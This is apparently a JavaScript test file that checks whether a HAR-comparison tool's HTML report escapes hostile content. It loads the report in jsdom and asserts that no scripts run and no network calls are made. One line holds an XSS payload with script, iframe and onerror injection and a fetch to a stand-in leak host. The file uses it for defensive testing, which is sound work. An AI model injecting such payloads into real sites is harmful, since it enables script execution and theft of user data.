// Development QA using the lab's isolated, locked jsdom dependency.
// This is a DOM execution check, not a real-browser/CSP certification.
import { createRequire } from 'node:module';
const { JSDOM, ResourceLoader, VirtualConsole } = createRequire(new URL('../lab/package.json', import.meta.url))('jsdom');
import assert from 'node:assert/strict';
import { mkdtempSync, readFileSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { spawnSync } from 'node:child_process';

const root = fileURLToPath(new URL('../', import.meta.url));
const fixture = JSON.parse(readFileSync(join(root, 'examples/fixtures/baseline.har'), 'utf8'));
const payload = '</script><script>globalThis.pwned=true;fetch("https://leak.example.invalid/")</script><iframe src="https://leak.example.invalid/"></iframe><img src=x onerror="globalThis.pwned=true">';
const before = structuredClone(fixture), after = structuredClone(fixture);
before.log.entries[0].response.content.text = JSON.stringify({ [payload]: 'SYNTHETIC_BODY_SECRET', user: {} });
after.log.entries[0].response.content.text = '{"user":{}}';
const dir = mkdtempSync(join(tmpdir(), 'scope-html-dom-'));
let dom;
try {
  const a = join(dir, 'baseline.har'), b = join(dir, 'candidate.har'), htmlPath = join(dir, 'report.html');
  writeFileSync(a, JSON.stringify(before)); writeFileSync(b, JSON.stringify(after));
  const result = spawnSync(process.execPath, [join(root, 'cli.mjs'), 'compare', '--baseline', a, '--candidate', b, '--html', htmlPath], { encoding: 'utf8', timeout: 10000 });
  assert.equal(result.status, 1, result.stdout + result.stderr);
  const networkAttempts = [], executionErrors = [];
  class BlockingResources extends ResourceLoader {
    fetch(url) { networkAttempts.push(url); return null; }
  }
  const virtualConsole = new VirtualConsole();
  virtualConsole.on('jsdomError', error => executionErrors.push(error.type));
  dom = new JSDOM(readFileSync(htmlPath, 'utf8'), {
    url: 'https://report.example.invalid/',
    runScripts: 'dangerously', // Deliberately catch executable output; no external access is permitted.
    resources: new BlockingResources(),
    virtualConsole,
    beforeParse(window) {
      window.pwned = false;
      window.fetch = url => { networkAttempts.push(String(url)); return Promise.resolve({ ok: false }); };
      window.open = url => { networkAttempts.push(String(url)); return null; };
    },
  });
  await new Promise((resolve, reject) => {
    if (dom.window.document.readyState === 'complete') { resolve(); return; }
    const timer = setTimeout(() => reject(new Error('DOM load timed out')), 3000);
    dom.window.addEventListener('load', () => { clearTimeout(timer); resolve(); }, { once: true });
  });
  assert.equal(dom.window.pwned, false);
  assert.equal(dom.window.document.querySelectorAll('script,iframe,img,object,embed,link,base,form').length, 0);
  assert.equal(dom.window.document.querySelectorAll('[src],[onerror],[onload]').length, 0);
  for (const link of dom.window.document.querySelectorAll('[href]')) {
    const target = link.getAttribute('href');
    assert.ok(/^#[A-Za-z0-9-]+$/.test(target));
    assert.equal(dom.window.document.querySelectorAll(target).length, 1);
  }
  assert.equal(dom.window.document.querySelectorAll('article').length, 1);
  assert.ok(dom.window.document.body.textContent.includes('<script>globalThis.pwned=true'));
  assert.ok(!dom.window.document.body.textContent.includes('SYNTHETIC_BODY_SECRET'));
  assert.deepEqual(networkAttempts, []);
  assert.deepEqual(executionErrors, []);
  console.log('DOM QA passed: hostile strings remain text, no executable/resource nodes, zero attempted resource/fetch/open calls.');
  console.log('Environment: jsdom, isolated synthetic report; no real-browser/CSP or perceptual screenshot claim.');
} finally { dom?.window.close(); rmSync(dir, { recursive: true, force: true }); }
